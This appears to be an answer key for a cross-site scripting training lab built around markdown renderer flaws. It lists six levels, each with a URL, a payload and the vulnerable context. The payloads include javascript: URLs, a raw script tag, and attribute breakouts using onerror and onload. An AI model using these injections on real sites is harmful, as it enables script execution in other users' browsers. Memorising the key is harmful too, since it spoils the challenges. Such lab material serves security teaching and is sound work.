# markdown — solutions

Markdown renderer bugs: missing scheme checks, raw HTML pass-through, unescaped attribute fields.

### markdown-level1

`/markdown/level1/?url=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: markdown link url slot, no scheme check, `<a href="...">`

### markdown-level2

`/markdown/level2/?src=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: markdown image src, no scheme check (img onerror also works: `x" onerror=alert(1) x="`)

### markdown-level3

`/markdown/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: html:true pass-through; raw HTML survives

### markdown-level4

`/markdown/level4/?url=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: autolink `<scheme:...>` → `<a href="...">`, no scheme whitelist

### markdown-level5

`/markdown/level5/?ref_url=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: reference-style markdown link URL substituted into href

### markdown-level6

`/markdown/level6/?title=x%22%20onload=alert(1)%20x=%22`

- payload: `x" onload=alert(1) x="`
- context: markdown image title field reflected unescaped into `<img title="...">`
